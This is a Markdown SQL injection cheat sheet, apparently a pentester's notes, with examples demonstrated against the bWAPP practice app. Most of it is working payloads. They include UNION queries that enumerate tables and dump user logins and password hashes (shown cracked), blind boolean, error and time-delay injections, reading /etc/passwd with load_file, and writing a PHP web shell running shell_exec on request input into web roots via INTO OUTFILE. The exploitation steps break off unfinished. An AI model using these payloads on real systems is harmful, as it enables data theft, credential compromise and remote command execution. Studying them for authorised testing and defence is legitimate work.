# SQL overview

* null session:

mysql -u root -h ip 

# SQL injection

## Payloads Cheat Sheet

My cheat sheet shows the methods of SQL injection. To effectively apply them, you need to know and use payloads as well. Here is more than enough: 

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based
* https://portswigger.net/web-security/sql-injection/cheat-sheet

## Injection types

Here are 5 types of injection to look for (source: [OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection))

* Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
* Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.
* Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
* Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).
* Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.

All examples are based on bWAPP (free pentesting practice tool) examples.

## Test for SQLi vulnerability

* Fuzz using special characters the inputs under test:

```
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content
```

## Example of UNION based sql injection 
This works if you get feedback from the server to your requests.


1. Get number of columns

```
1' order by 1; -- -- ok
1' order by 2; -- -- ok
...
1' order by 7; -- -- ok
1' order by 8; -- -- error -> 7 columns available

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

#using NULL is benficial if it is not certain if data types in columns match

```
Other faster methods (if error messages are enabled):

```
' UNION SELECT 1,2,3,4,5,6,7; -- --	True

1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100; -- --

```


2. identify vulnerable columns

```
-' union all select 1,2,3,4,5,6,7; -- --

Title 	Release 	Character 	Genre 	IMDb
2 	3 	5 	4 	Link

#columns 2,3,4,5 are vulnerable
```

Get Database version:

```
-' union all select 1,@@version,3,4,5,6,7; -- -

#5.0.96-0ubuntu3 > 5 -> continue with table name enumeration

#for database name

-' union all select 1,database(),3,4,5,6,7; -- -

#we get bWAPP

#time for table name

-' union all select 1,group_concat(0x7c,table_name,0x7C),3,4,5,6,7 from information_schema.tables where table_schema=database(); -- -

#output: blog,heroes,movies,users,visitors

#get column names from users table

-' union all select 1,group_concat(0x7c,column_name,0x7C),3,4,5,6,7 from information_schema.columns where table_schema=database(); -- -

#output for column names: id,owner,entry,date,id,login,password,secret,id,title,release_year,genre,main_character,imdb,tickets_stock,id,login,password,email,secret,activation_code,activated,reset_code,admin,id,ip_address,user_agent,date

#columns of particular table 
#encode table name "users" as decimal using: http://www.unit-conversion.info/texttools/ascii/

-' union all select 1,group_concat(0x7c,column_name,0x7C),3,4,5,6,7 from information_schema.columns where table_name=char(117,115,101,114,115); -- -

#output of columns in "users": id,login,password,email,secret,activation_code,activated,reset_code,admin,uid,name,pass,mail,theme,signature,signature_format,created,access,login,status,timezone,language,picture,init,data

#lets get login and password 

-' union all select 1,group_concat(login,0x7C,password,0x7C,admin),3,4,5,6,7 from users; -- -

#output.
#A.I.M.|6885858486f31043e5839c735d99457f045affd0|1,bee|6885858486f31043e5839c735d99457f045affd0|1,ok|#7a85f4764bbd6daf1c3545efbbf0f279a6dc0beb|0
#obviously column with 1 indicates admin
#cracking with hashcat delivers:
#6885858486f31043e5839c735d99457f045affd0:bug
#7a85f4764bbd6daf1c3545efbbf0f279a6dc0beb:ok


```
## Blind SQL Injection

See also: https://owasp.org/www-community/attacks/Blind_SQL_Injection

### Detection of Blind SQL entry point

#### Conditional Response

```
# returns some result
…xyz' AND '1'='1

# no result
…xyz' AND '1'='2
```
If the first letter of Password is 's' then this query is going to return some Conditional Statement different from normal reponse
`' OR SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

#### Error based 

```
1' or 1=1# returns no erroe

1' or 1=2# returns error or negative response
```

If the first letter of Password is 's' then this query is going to return some Error

`' OR (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`


#### Time based 

If time based injection is valid then for TRUE conditions certain amount of delay shall be present.

```
' AND sleep(15)#


Benchmark:

' AND BENCHMARK(10000000,SHA1(1337))#
```
Sometimes it will be needed to concatenate the strings to make it work. Try it if everything else fails:

`xyz'||sleep(15)--` or `xyz'%3bsleep(15)--`

##### Exploitation of time based BLIND SQLi

1. Detect time based sqli by using time delays:

`'; IF (1=1) WAITFOR DELAY '0:0:10'--` shall cause a time delay

If it doesn't work use payload cheat sheets mentioned above to identify correct datase type.

2. 


# Get shell from sql-injection


## Load files
```
UNION SELECT 1, load_file(/etc/passwd) #

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

## Write files
```
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```









